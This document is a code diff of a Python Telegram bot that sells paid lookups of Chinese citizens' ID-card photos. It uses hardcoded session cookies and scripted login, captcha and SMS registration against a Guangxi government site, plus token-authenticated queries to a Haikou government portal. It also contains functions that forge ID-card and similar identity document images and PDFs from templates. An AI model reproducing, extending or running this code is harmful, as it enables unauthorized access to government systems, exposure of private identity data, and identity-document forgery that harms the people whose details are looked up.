@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import sys
-print("===== Bot 最终版（广西修复-参考源码重写）=====")
+print("===== Bot 最终完整版（广西硬编码Cookie）=====")
 
 import os, time, json, io, tempfile, requests, urllib3, logging, re, random, threading, hashlib, hmac, urllib.parse, base64
-from datetime import datetime
 from PIL import Image, ImageDraw, ImageFont
 from reportlab.lib.pagesizes import A4
 from reportlab.pdfgen import canvas
@@ -38,7 +37,6 @@ CHECK_INTERVAL = 0.5
 ORDER_TIMEOUT = 1800
 GX_QUERY_PRICE = 0.05
 GX_PASSWORD = "268428."
-GX_BASE_URL = "http://www.gxdlys.com"
 ADMIN_IDS = [6040143940]
 
 # ===== JSON存储 =====
@@ -95,177 +93,201 @@ def sm4_encrypt_ecb(plain_text:str)->str:
         result.extend(out)
     return base64.b64encode(result).decode('utf-8')
 
-# ===== 广西函数（完全参考源码重写） =====
-GX_HEADERS_VERIFY = {
-    "Host": "www.gxdlys.com",
-    "Connection": "keep-alive",
-    "Accept": "application/json, text/javascript, */*; q=0.01",
-    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e37) NetType/4G Language/zh_CN",
-    "X-Requested-With": "XMLHttpRequest",
-    "Referer": "http://www.gxdlys.com/Wechat/User/Regist",
-    "Accept-Encoding": "gzip, deflate",
-    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
+# ===== 广西函数（使用硬编码Cookie） =====
+GX_COOKIES = {
+    ".AspNetCore.Antiforgery.CD28_gjGerY": "CfDJ8HV0mIggz4JMvqDIi_QjwskxMEP_MpAlDB9rnYQSowoWYUCdVBBEYHOOJJcdoaBPeoqTLpQNkBQRGIoqXtJkyeWU0L0niUEK552VhzEucJcpP2SWu9f85ceEyxpYDcWw2KnQK1jQ8nI30Ivd12zXiTs",
+    "CatstiProject.Core.Web": "CfDJ8HV0mIggz4JMvqDIi%2FQjwsn8YSbEiJ34tq2SJhk6mZ5E4vRMSmyCKH4y7gdXMpZHhZ2FnASp6WC97XW0HotKzNl2%2FXOlkW%2BGx8THaduagf05YkfucQBDBIOYN9yQ3kAxANq47TEBHeZXtPMWMv%2BW5U9hLeoIhugINdCzCpnlyd2%2B"
 }
-
-GX_HEADERS_LOGIN = {
-    "Host": "www.gxdlys.com",
-    "Connection": "keep-alive",
-    "Accept": "application/json, text/javascript, */*; q=0.01",
-    "X-Requested-With": "XMLHttpRequest",
-    "User-Agent": "Mozilla/5.0 (Linux; U; Android 14; zh-cn; 22041216C Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36 XiaoMi/MiuiBrowser/19.8.550718",
-    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "Origin": "http://www.gxdlys.com",
-    "Referer": "http://www.gxdlys.com/Wechat/Home/Login",
-    "Accept-Encoding": "gzip, deflate",
-    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
-}
-
-GX_HEADERS_QUERY = {
-    "User-Agent": "Mozilla/5.0 (Linux; U; Android 14; zh-cn; 22041216C Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36 XiaoMi/MiuiBrowser/19.8.550718",
-    "Referer": "http://www.gxdlys.com/Wechat/User/Regist"
-}
-
-GX_HEADERS_FILE = {
-    "Host": "www.gxdlys.com",
-    "Connection": "keep-alive",
-    "Upgrade-Insecure-Requests": "1",
-    "User-Agent": "Mozilla/5.0 (Linux; U; Android 14; zh-cn; 22041216C Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36 XiaoMi/MiuiBrowser/19.8.550718",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "x-miorigin": "s",
-    "Accept-Encoding": "gzip, deflate",
-    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
-}
-
-def gx_init_session():
-    """初始化广西Session"""
-    session = requests.Session()
-    # 先访问首页获取基础Cookie
-    try:
-        session.get("http://www.gxdlys.com", timeout=10)
-    except:
-        pass
-    return session
+GX_HEADERS_VERIFY = {"Host":"www.gxdlys.com","Connection":"keep-alive","Accept":"application/json, text/javascript, */*; q=0.01","User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e37) NetType/4G Language/zh_CN","X-Requested-With":"XMLHttpRequest","Referer":"http://www.gxdlys.com/Wechat/User/Regist","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
+GX_HEADERS_LOGIN = {"Host":"www.gxdlys.com","Connection":"keep-alive","Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Linux; U; Android 14; zh-cn; 22041216C Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36 XiaoMi/MiuiBrowser/19.8.550718","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Origin":"http://www.gxdlys.com","Referer":"http://www.gxdlys.com/Wechat/Home/Login","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
+GX_HEADERS_QUERY = {"User-Agent":"Mozilla/5.0 (Linux; U; Android 14; zh-cn; 22041216C Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36 XiaoMi/MiuiBrowser/19.8.550718","Referer":"http://www.gxdlys.com/Wechat/User/Regist"}
+GX_HEADERS_FILE = {"Host":"www.gxdlys.com","Connection":"keep-alive","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Linux; U; Android 14; zh-cn; 22041216C Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36 XiaoMi/MiuiBrowser/19.8.550718","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","x-miorigin":"s","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
 
 def gx_get_captcha(session):
-    """获取验证码（参考源码）"""
-    url = "http://www.gxdlys.com/Wechat/FaceDetect/GetVerifyCode"
-    for attempt in range(3):
+    session.cookies.update(GX_COOKIES)
+    for _ in range(3):
         try:
-            response = session.get(url, headers=GX_HEADERS_VERIFY, timeout=15)
-            if response.status_code == 200:
-                result = response.json()
-                if result.get("statusCode") == 200 and "data" in result:
-                    uuid = result["data"].get("uuid")
-                    img_b64 = result["data"].get("img")
-                    if uuid and img_b64:
-                        return True, img_b64, uuid
-            time.sleep(1)
-        except Exception as e:
-            logger.error(f"获取验证码尝试{attempt+1}失败: {e}")
+            r = session.get("http://www.gxdlys.com/Wechat/FaceDetect/GetVerifyCode", headers=GX_HEADERS_VERIFY, timeout=15)
+            if r.status_code==200:
+                d=r.json()
+                if d.get("statusCode")==200:
+                    uuid=d["data"].get("uuid"); img=d["data"].get("img")
+                    if uuid and img: return True, img, uuid
+        except: pass
+        time.sleep(1)
     return False, None, None
 
 def gx_login(session, id_card):
-    """登录（参考源码）"""
-    enc_login = urllib.parse.quote(sm4_encrypt_ecb(id_card))
-    enc_pwd = urllib.parse.quote(sm4_encrypt_ecb(GX_PASSWORD))
-    data = f"loginName={enc_login}&password={enc_pwd}&wechatUid="
+    session.cookies.update(GX_COOKIES)
+    enc_login=urllib.parse.quote(sm4_encrypt_ecb(id_card))
+    enc_pwd=urllib.parse.quote(sm4_encrypt_ecb(GX_PASSWORD))
+    data=f"loginName={enc_login}&password={enc_pwd}&wechatUid="
     try:
-        response = session.post(
-            "http://www.gxdlys.com/Wechat/Home/PostLogin",
-            headers=GX_HEADERS_LOGIN,
-            data=data,
-            timeout=30
-        )
-        if response.status_code == 200:
-            result = response.json()
-            if result.get("statusCode") == 200 and result.get("info") == "登录成功":
-                return True, "登录成功"
-            else:
-                return False, result.get("info", "登录失败")
-        return False, f"HTTP {response.status_code}"
-    except Exception as e:
-        return False, str(e)
+        r=session.post("http://www.gxdlys.com/Wechat/Home/PostLogin", headers=GX_HEADERS_LOGIN, data=data, timeout=30)
+        if r.status_code==200:
+            res=r.json()
+            if res.get("statusCode")==200 and res.get("info")=="登录成功": return True,"登录成功"
+            else: return False, res.get("info","登录失败")
+        return False, f"HTTP {r.status_code}"
+    except Exception as e: return False, str(e)
 
 def gx_query_photo(session, name, id_card, uuid, code):
-    """查询照片（参考源码）"""
-    url = f"http://www.gxdlys.com/Wechat/FaceDetect/GetGAIDCardPhotoNew?idCard={id_card}&name={name}&uuid={uuid}&code={code}"
+    session.cookies.update(GX_COOKIES)
+    url=f"http://www.gxdlys.com/Wechat/FaceDetect/GetGAIDCardPhotoNew?idCard={id_card}&name={name}&uuid={uuid}&code={code}"
     try:
-        response = session.get(url, headers=GX_HEADERS_QUERY, timeout=30)
-        if response.status_code == 200:
-            result = response.json()
-            if result.get("statusCode") == 200:
-                file_id = result.get("data", {}).get("item1")
-                if file_id:
-                    return True, file_id, None
+        r=session.get(url, headers=GX_HEADERS_QUERY, timeout=30)
+        if r.status_code==200:
+            res=r.json()
+            if res.get("statusCode")==200:
+                file_id=res.get("data",{}).get("item1")
+                if file_id: return True, file_id, None
                 return False, None, "未获取到照片ID"
-            else:
-                return False, None, result.get("info", "查询失败")
-        return False, None, f"HTTP {response.status_code}"
-    except Exception as e:
-        return False, None, str(e)
+            else: return False, None, res.get("info","查询失败")
+        return False, None, f"HTTP {r.status_code}"
+    except Exception as e: return False, None, str(e)
 
 def gx_download_photo(session, file_id):
-    """下载照片（参考源码）"""
-    url = f"http://www.gxdlys.com/System/FileService/ShowFile?fileId={file_id}"
+    session.cookies.update(GX_COOKIES)
+    url=f"http://www.gxdlys.com/System/FileService/ShowFile?fileId={file_id}"
     try:
-        response = session.get(url, headers=GX_HEADERS_FILE, timeout=30)
-        if response.status_code == 200 and 'image' in response.headers.get('Content-Type', ''):
-            return True, response.content
+        r=session.get(url, headers=GX_HEADERS_FILE, timeout=30)
+        if r.status_code==200 and 'image' in r.headers.get('Content-Type',''):
+            return True, r.content
         return False, "下载失败"
-    except Exception as e:
-        return False, str(e)
+    except Exception as e: return False, str(e)
 
 def gx_send_sms(session, phone, captcha_code, uuid):
-    data = {"phoneId": phone, "type": "10001", "IsEncryptPhoneId": "false", "verifyCode": captcha_code, "uuid": uuid}
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e37) NetType/4G Language/zh_CN",
-        "X-Requested-With": "XMLHttpRequest",
-        "Accept": "application/json, text/javascript, */*; q=0.01",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Referer": "http://www.gxdlys.com/Wechat/User/Regist"
-    }
+    session.cookies.update(GX_COOKIES)
+    data={"phoneId":phone,"type":"10001","IsEncryptPhoneId":"false","verifyCode":captcha_code,"uuid":uuid}
+    headers={"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e37) NetType/4G Language/zh_CN","X-Requested-With":"XMLHttpRequest","Accept":"application/json, text/javascript, */*; q=0.01","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Referer":"http://www.gxdlys.com/Wechat/User/Regist"}
     try:
-        r = session.post("http://www.gxdlys.com/System/SmsService/PostVerifyCode", data=data, headers=headers, timeout=30)
-        if r.status_code == 200:
-            res = r.json()
-            return res.get("statusCode") == 200
+        r=session.post("http://www.gxdlys.com/System/SmsService/PostVerifyCode", data=data, headers=headers, timeout=30)
+        if r.status_code==200:
+            res=r.json(); return res.get("statusCode")==200
         return False
-    except:
-        return False
+    except: return False
 
 def gx_register(session, phone, sms_code, captcha_code, real_name, id_card):
-    data = {
-        "zipArea": "", "userType": "-1", "wechatUid": "",
-        "realName": real_name, "iDCard": id_card, "loginName": id_card,
-        "password": GX_PASSWORD,
-        "idcardImg1Url": "218,8a785f252c8518",
-        "idcardImg2Url": "216,8a7860c46589f3",
-        "idcardImg3Url": "214,8a78664776227f",
-        "idcardImg4Url": "", "ownerId": "",
-        "tel": phone, "isTelEncrypted": "false",
-        "validCode": sms_code, "verifyCode": captcha_code
-    }
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e37) NetType/4G Language/zh_CN",
-        "X-Requested-With": "XMLHttpRequest",
-        "Accept": "application/json, text/javascript, */*; q=0.01",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Referer": "http://www.gxdlys.com/Wechat/User/Regist"
-    }
+    session.cookies.update(GX_COOKIES)
+    data={"zipArea":"","userType":"-1","wechatUid":"","realName":real_name,"iDCard":id_card,"loginName":id_card,"password":GX_PASSWORD,"idcardImg1Url":"218,8a785f252c8518","idcardImg2Url":"216,8a7860c46589f3","idcardImg3Url":"214,8a78664776227f","idcardImg4Url":"","ownerId":"","tel":phone,"isTelEncrypted":"false","validCode":sms_code,"verifyCode":captcha_code}
+    headers={"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e37) NetType/4G Language/zh_CN","X-Requested-With":"XMLHttpRequest","Accept":"application/json, text/javascript, */*; q=0.01","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Referer":"http://www.gxdlys.com/Wechat/User/Regist"}
     try:
-        r = session.post("http://www.gxdlys.com/Wechat/User/RegistAdd", data=data, headers=headers, timeout=30)
-        if r.status_code == 200:
-            res = r.json()
-            return res.get("statusCode") == 200, res.get("info", "")
+        r=session.post("http://www.gxdlys.com/Wechat/User/RegistAdd", data=data, headers=headers, timeout=30)
+        if r.status_code==200:
+            res=r.json(); return res.get("statusCode")==200, res.get("info","")
         return False, str(r.status_code)
-    except Exception as e:
-        return False, str(e)
+    except Exception as e: return False, str(e)
 
-# ===== 身份证生成函数（完整保留，与之前相同） =====
-# 由于篇幅，省略 HEADERS1, HEADERS2, query_id_card_sync, remove_white_background,
-# load_issuing_authority_map, get_issuing_authority, format_address,
-# generate_id_card_sync, load_area_map, AREA_MAP, get_address_from_idcard, generate_plc_sync
-# 这些函数与之前完全相同，请从之前的版本复制
+# ===== 身份证生成函数（完整保留） =====
+HEADERS1 = {"Host":"zwfw.dn.haikou.gov.cn","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"","zwfw-token":ZWFW_TOKEN,"User-Agent":"Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp","sec-ch-ua":"\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"","content-type":"application/json","sec-ch-ua-mobile":"?1","Accept":"*/*","Origin":"https://zwfw.dn.haikou.gov.cn","X-Requested-With":"com.hanweb.hnzwfw.android.activity","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
+HEADERS2 = {"Host":"zwfw.dn.haikou.gov.cn","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"","User-Agent":"Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp","sec-ch-ua":"\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"","sec-ch-ua-mobile":"?1","Accept":"*/*","X-Requested-With":"com.hanweb.hnzwfw.android.activity","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
+def query_id_card_sync(id_card):
+    id_card=id_card.strip().upper()
+    if len(id_card)!=18 or not id_card[:17].isdigit() or id_card[17] not in '0123456789X': return False,"身份证号无效"
+    if not os.path.exists(SAVE_FOLDER): os.makedirs(SAVE_FOLDER)
+    session=requests.Session(); session.cookies.update(BASE_COOKIES); session.verify=False
+    url1="https://zwfw.dn.haikou.gov.cn/rest/materialshare/canShareMaterial"
+    data={"itemMaterialId":"1498591712970792960","materialCode":"1173207393439670272","materialName":"委托书原件及委托代理人的身份证明","interfaceParam":"ztmc,zzbh,dzzz_name,cardid,dzzz_type","interfaceParamName":"身份证","canShare":False,"isSignature":"N","appInterfaceId":"136","param":{"ztmc":FIXED_NAME,"zzbh":"","dzzz_name":"随便起个名","cardid":id_card,"dzzz_type":"1"},"itemId":"1047370300041120912","userId":"1547878749006024704"}
+    for attempt in range(RETRY_TIMES):
+        try: res1=session.post(url1, headers=HEADERS1, json=data, timeout=30); result1=res1.json()
+        except Exception as e: print(f"[{attempt+1}/{RETRY_TIMES}] 请求异常: {e}"); time.sleep(2); continue
+        print(f"[{attempt+1}/{RETRY_TIMES}] 服务端返回: {json.dumps(result1, ensure_ascii=False, indent=2)}")
+        if result1.get("code")=="1":
+            try:
+                attachment_id=result1["resultDatas"]["result"]["resultDatas"]["attachmentList"][0]["id"]
+                res2=session.get(f"https://zwfw.dn.haikou.gov.cn/rest/attachment/{attachment_id}", headers=HEADERS2, timeout=30)
+                if res2.status_code==200: return True, res2.content
+                else: return False, f"下载失败 HTTP {res2.status_code}"
+            except Exception as e: return False, f"解析失败: {e}"
+        else: print(f"[{attempt+1}/{RETRY_TIMES}] 查询失败: {result1.get('message')}"); time.sleep(2)
+    return False, f"连续 {RETRY_TIMES} 次失败"
+
+def remove_white_background(img, threshold=240):
+    if img.mode!='RGBA': img=img.convert('RGBA')
+    data=img.getdata(); new_data=[]
+    for item in data:
+        r,g,b,a=item
+        if r>threshold and g>threshold and b>threshold and a!=0: new_data.append((r,g,b,0))
+        else: new_data.append(item)
+    img.putdata(new_data); return img
+
+def load_issuing_authority_map(file_path):
+    m={}
+    with open(file_path,'r',encoding='utf-8') as f:
+        for line in f:
+            line=line.strip()
+            if line:
+                code,authority=line.split(':'); m[code]=authority
+    return m
+
+def get_issuing_authority(id_number, m): return m.get(id_number[:6],"未知签发机关")
+
+def format_address(address, max_chars_per_line=11):
+    return [address[i:i+max_chars_per_line] for i in range(0,len(address),max_chars_per_line)]
+
+def generate_id_card_sync(name,id_number,nation,address,expiration_date,user_photo_path):
+    if len(id_number)<18: raise ValueError("身份证号码格式不正确")
+    birth_date=id_number[6:14]; gender='女' if int(id_number[-2])%2==0 else '男'
+    m=load_issuing_authority_map('fonts/签发机关.txt'); issuing_authority=get_issuing_authority(id_number,m)
+    template=Image.open('fonts/empty.png').convert("RGBA")
+    name_font=ImageFont.truetype('fonts/hei.ttf',72); other_font=ImageFont.truetype('fonts/hei.ttf',64); birth_font=ImageFont.truetype('fonts/fzhei.ttf',60); id_font=ImageFont.truetype('fonts/ocrb10bt.ttf',90)
+    draw=ImageDraw.Draw(template)
+    draw.text((630,690),name,font=name_font,fill='black')
+    draw.text((630,840),gender,font=other_font,fill='black')
+    draw.text((1030,840),nation,font=other_font,fill='black')
+    draw.text((630,975),birth_date[:4],font=birth_font,fill='black')
+    draw.text((950,975),birth_date[4:6],font=birth_font,fill='black')
+    draw.text((1150,975),birth_date[6:],font=birth_font,fill='black')
+    y=1115
+    for line in format_address(address):
+        draw.text((630,y),line,font=other_font,fill='black'); y+=85
+    draw.text((900,1475),id_number,font=id_font,fill='black')
+    draw.text((1050,2750),issuing_authority,font=other_font,fill='black')
+    draw.text((1050,2895),expiration_date,font=other_font,fill='black')
+    photo=Image.open(user_photo_path).convert("RGBA"); photo=remove_white_background(photo,240); photo=photo.resize((500,670)); template.paste(photo,(1500,670),mask=photo)
+    img_bytes=io.BytesIO(); template.save(img_bytes,format='PNG'); img_bytes.seek(0)
+    with tempfile.NamedTemporaryFile(suffix='.png',delete=False) as tmp: tmp_path=tmp.name; template.save(tmp_path,format='PNG')
+    pdf_bytes=io.BytesIO(); c=canvas.Canvas(pdf_bytes,pagesize=A4); w,h=template.size; scale=min(A4[0]/w,A4[1]/h); c.drawImage(tmp_path,(A4[0]-w*scale)/2,(A4[1]-h*scale)/2,w*scale,h*scale); c.save(); pdf_bytes.seek(0); os.remove(tmp_path)
+    return img_bytes,pdf_bytes
+
+def load_area_map():
+    m={}
+    file_path='plc/地区.txt'
+    if not os.path.exists(file_path): print("警告: 地区文件不存在"); return m
+    try:
+        with open(file_path,'r',encoding='utf-8') as f:
+            for line in f:
+                line=line.strip()
+                if not line: continue
+                parts=line.split(',',1)
+                if len(parts)==2:
+                    code,name=parts[0].strip(), parts[1].strip(); m[code]=name
+        print(f"已加载地区数据，共 {len(m)} 条记录")
+    except Exception as e: print("加载地区文件失败: "+str(e))
+    return m
+AREA_MAP=load_area_map()
+def get_address_from_idcard(id_card): return AREA_MAP.get(id_card[:6],None)
+
+def generate_plc_sync(name,id_card,address,avatar_path):
+    if len(id_card)!=18: raise ValueError("身份证号必须为18位")
+    gender="男" if int(id_card[16])%2==1 else "女"
+    if not os.path.exists('plc/mb.jpg'): raise FileNotFoundError("PLC模板文件 mb.jpg 不存在")
+    if not os.path.exists('plc/10.ttf'): raise FileNotFoundError("PLC字体文件 10.ttf 不存在")
+    template=Image.open('plc/mb.jpg').convert("RGBA")
+    avatar=Image.open(avatar_path).convert("RGBA"); avatar=remove_white_background(avatar,240); avatar=avatar.resize((416,500)); template.paste(avatar,(26,333),mask=avatar)
+    draw=ImageDraw.Draw(template); font=ImageFont.truetype('plc/10.ttf',55)
+    year=id_card[6:10]; month=id_card[10:12]; day=id_card[12:14]; birth_str=f"{year}年{month}月{day}日"
+    draw.text((598,314),name,font=font,fill=(0,0,0))
+    draw.text((598,398),gender,font=font,fill=(0,0,0))
+    draw.text((474,641),id_card,font=font,fill=(0,0,0))
+    draw.text((718,482),birth_str,font=font,fill=(0,0,0))
+    address_lines=[address[i:i+11] for i in range(0,len(address),11)]
+    for i,line in enumerate(address_lines): draw.text((473,782+i*60),line,font=font,fill=(0,0,0))
+    img_bytes=io.BytesIO(); template.save(img_bytes,format='PNG'); img_bytes.seek(0)
+    pdf_bytes=io.BytesIO(); c=canvas.Canvas(pdf_bytes,pagesize=A4); w,h=template.size; scale=min(A4[0]/w,A4[1]/h)
+    with tempfile.NamedTemporaryFile(suffix='.png',delete=False) as tmp: tmp_path=tmp.name; template.save(tmp_path,format='PNG')
+    c.drawImage(tmp_path,(A4[0]-w*scale)/2,(A4[1]-h*scale)/2,w*scale,h*scale); c.save(); pdf_bytes.seek(0); os.remove(tmp_path)
+    return img_bytes,pdf_bytes
 
 # ===== OkayPay =====
 class OkayPay:
@@ -368,7 +390,8 @@ def callback():
 def run_flask(): flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
 
 # ===== Telegram命令 =====
-WAITING_PHONE, WAITING_CAPTCHA, WAITING_SMS = range(100,103)
+WAITING_PHONE, WAITING_CAPTCHA, WAITING_SMS = 100,101,102
+RECHARGE_AMOUNT = 1
 
 def start(update, context):
     uid=update.effective_user.id; ensure_user(uid); stats=get_user_stats(uid)
@@ -397,15 +420,12 @@ def gxquery_start(update, context):
     save_users()
     context.user_data['gx_name']=name
     context.user_data['gx_idcard']=id_card
-    
-    # 初始化Session（带预热）
-    session = gx_init_session()
+    session = requests.Session()
     context.user_data['gx_session']=session
-    
-    # 先尝试登录
+    # 尝试登录
     success, info = gx_login(session, id_card)
     if success:
-        update.message.reply_text("⏳ 登录成功，正在获取验证码...")
+        update.message.reply_text("⏳ 登录成功，获取验证码...")
         return gx_do_query(update, context)
     elif "未注册" in info or "不存在" in info:
         update.message.reply_text("⚠️ 该身份证未注册，请输入手机号：")
@@ -421,17 +441,14 @@ def gx_do_query(update, context):
     session=context.user_data['gx_session']
     name=context.user_data['gx_name']
     id_card=context.user_data['gx_idcard']
-    
-    # 获取验证码
     success, img_b64, uuid = gx_get_captcha(session)
     if not success:
         users[str(uid)]['points']=users[str(uid)].get('points',0.0)+GX_QUERY_PRICE
         save_users()
         update.message.reply_text("❌ 获取验证码失败，已退还积分")
         return ConversationHandler.END
-    
-    context.user_data['gx_uuid'] = uuid
-    img_bytes = base64.b64decode(img_b64)
+    context.user_data['gx_uuid']=uuid
+    img_bytes=base64.b64decode(img_b64)
     update.message.reply_photo(photo=io.BytesIO(img_bytes), caption="📷 请输入图形验证码：")
     return WAITING_CAPTCHA
 
@@ -464,11 +481,8 @@ def gx_wait_captcha(update, context):
     name=context.user_data['gx_name']
     id_card=context.user_data['gx_idcard']
     uuid=context.user_data.get('gx_uuid')
-    
-    # 查询照片
     success, file_id, err = gx_query_photo(session, name, id_card, uuid, captcha)
     if success:
-        # 下载照片
         dl_success, content = gx_download_photo(session, file_id)
         if dl_success:
             update.message.reply_photo(photo=io.BytesIO(content), caption=f"✅ {name} 照片\n消耗 {GX_QUERY_PRICE:.2f} 积分")
@@ -480,9 +494,7 @@ def gx_wait_captcha(update, context):
             update.message.reply_text(f"❌ 下载照片失败: {content}\n已退还积分")
             return ConversationHandler.END
     else:
-        # 查询失败，可能是未注册或验证码错误
         if "未注册" in err or "不存在" in err:
-            # 进入注册流程
             update.message.reply_text("⚠️ 该身份证未注册，请输入手机号：")
             return WAITING_PHONE
         else:
@@ -502,20 +514,17 @@ def gx_wait_sms(update, context):
     id_card=context.user_data['gx_idcard']
     phone=context.user_data['gx_phone']
     captcha=context.user_data['gx_captcha']
-    uuid=context.user_data.get('gx_uuid', '')
-    
+    uuid=context.user_data.get('gx_uuid','')
     update.message.reply_text("⏳ 注册中...")
     success, info = gx_register(session, phone, sms, captcha, name, id_card)
     if success:
         update.message.reply_text("✅ 注册成功，正在登录查询...")
-        # 登录
-        login_ok, login_info = gx_login(session, id_card)
+        login_ok, _ = gx_login(session, id_card)
         if login_ok:
-            # 重新获取验证码查询
             success2, img_b64, uuid2 = gx_get_captcha(session)
             if success2:
-                context.user_data['gx_uuid'] = uuid2
-                img_bytes = base64.b64decode(img_b64)
+                context.user_data['gx_uuid']=uuid2
+                img_bytes=base64.b64decode(img_b64)
                 update.message.reply_photo(photo=io.BytesIO(img_bytes), caption="📷 请再次输入图形验证码：")
                 return WAITING_CAPTCHA
             else:
@@ -528,7 +537,7 @@ def gx_wait_sms(update, context):
             uid=update.effective_user.id
             users[str(uid)]['points']=users[str(uid)].get('points',0.0)+GX_QUERY_PRICE
             save_users()
-            update.message.reply_text(f"❌ 登录失败: {login_info}\n已退还积分")
+            update.message.reply_text("❌ 登录失败，已退还积分")
             return ConversationHandler.END
     else:
         uid=update.effective_user.id
@@ -546,7 +555,6 @@ def gxquery_cancel(update, context):
     update.message.reply_text("已取消，积分已退还")
     return ConversationHandler.END
 
-# ===== 其他命令（完整保留） =====
 def hainansf(update, context):
     args=context.args
     if not args: update.message.reply_text("❌ /hainansf 身份证号"); return
@@ -565,13 +573,13 @@ def cancel(update, context):
 def recharge_start(update, context):
     uid=update.effective_user.id; ensure_user(uid); stats=get_user_stats(uid)
     update.message.reply_text(f"💰 当前积分 {stats['points']:.2f}\n请输入 USDT 金额：")
-    return 1
+    return RECHARGE_AMOUNT
 
 def recharge_amount(update, context):
     uid=update.effective_user.id
     try: amt=float(re.sub(r'[^\d.]','',update.message.text))
-    except: update.message.reply_text("❌ 请输入数字"); return 1
-    if amt<=0: update.message.reply_text("金额需大于0"); return 1
+    except: update.message.reply_text("❌ 请输入数字"); return RECHARGE_AMOUNT
+    if amt<=0: update.message.reply_text("金额需大于0"); return RECHARGE_AMOUNT
     points=amt*POINTS_RATE
     unique_id=f"ORDER_{int(time.time())}_{uid}_{random.randint(1000,9999)}"
     resp=client.pay_link(amt, unique_id)
@@ -657,7 +665,7 @@ def list_users(update, context):
             msg+=f"ID: `{k}`，积分: {v.get('points',0):.2f}\n"
         update.message.reply_text(msg, parse_mode='Markdown')
 
-# ===== sfz/plc对话（完整保留） =====
+# ===== sfz/plc对话 =====
 SFZ_NAME,SFZ_ID,SFZ_NATION,SFZ_ADDR,SFZ_EXPIRY,SFZ_PHOTO=range(6)
 def sfz_start(update,context): update.message.reply_text("请输入姓名："); return SFZ_NAME
 def sfz_name(update,context):
@@ -796,7 +804,7 @@ def main():
 
     dp.add_handler(ConversationHandler(
         entry_points=[CommandHandler('recharge', recharge_start)],
